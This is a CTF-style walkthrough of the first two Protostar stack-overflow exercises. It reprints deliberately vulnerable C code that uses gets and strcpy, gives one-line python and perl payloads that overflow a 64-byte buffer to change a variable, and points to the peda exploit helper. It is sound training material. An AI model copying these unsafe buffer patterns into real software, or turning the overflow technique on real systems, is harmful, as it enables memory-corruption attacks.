These are the solutions to the Protostar Game on Exercise Solutions

Stack 0 - This is the first exercise in the protostar game and as is customary the challenge itself is gentle. Also
as with these games there is more than one way of solving and in these cases there are also more than one language
can be used. The first challenge shows a piece of c code which can be exploited, the site itself states that the
main concept is that memory can be accessed outside of its allocated region and any modifications can alter program
execution. The first challenge is basically an overflow challenge, the code itself is this

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
 volatile int modified;
 char buffer[64];

 modified = 0;
 gets(buffer);

 if(modified != 0) {
  printf("you have changed the 'modified' variable\n");
 } else {
  printf("Try again?\n");
 }
}

As you can see the variable called modified is put on to the stack and then the buufer which is 64 bytes is
assigned. Because for this challenge there is no limitation on writing to the stack all that is needed is to write
enough to overflow the stack like so in python

python -c "print 'A'*68" | ./stack0
Essentially you are sending numerous copies of the letter 'A' into the stack in order to overflow it which will
then give you the 'you have changed the 'modified' variable' message.
There are also perl solutions around like this
perl -e 'print "A"x65' | ./stack0
But I am not that familiar with perl so this is not really an option for me but the basic premise is the same.





Stack 1 -
As is the norm in a lot of online wargames a level is similar to the preceeding one and this is the case here too.
The main difference from the last challenge is that instead of merely changing the value it needs to be changed to
meet a specific value which is 0x61626364, or “dcba” in ASCII. The solution is going to be similar in that you will
have to add in a certain amount of material in order to obtain this value. The code itself looks like this

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
 volatile int modified;
 char buffer[64];

 if(argc == 1) {
  errx(1, "please specify an argument\n");
 }

 modified = 0;
 strcpy(buffer, argv[1]);

 if(modified == 0x61626364) {
  printf("you have correctly got the variable to the right value\n");
 } else {
  printf("Try again, you got 0x%08x\n", modified);
 }
}

The solution is like above -

python -c "print 'A'*64+'dcba'"

There are 64 copies of 'A' sent to the stack and 'abcd' which is read in backwards due to the x86 platform being
little endian, there is a good explanation on endianess and other bits here -
http://betterexplained.com/articles/understanding-big-and-little-endian-byte-order/
Also like above there are similar solutions available in perl, ruby and others but they all use the same logic, it
is also worth poiting out that these challenges are often only solved after brute force trial and error of the 
amount of material needed to force an overflow.
*******************************************************************************************************************
Important - There is a python exploit development script called peda which can be used in conjunction with gbd and
can reduce the amount of work needed, the code is available here https://github.com/longld/peda and there is a 
guide here http://security.cs.pub.ro/hexcellents/wiki/kb/toolset/peda
*******************************************************************************************************************
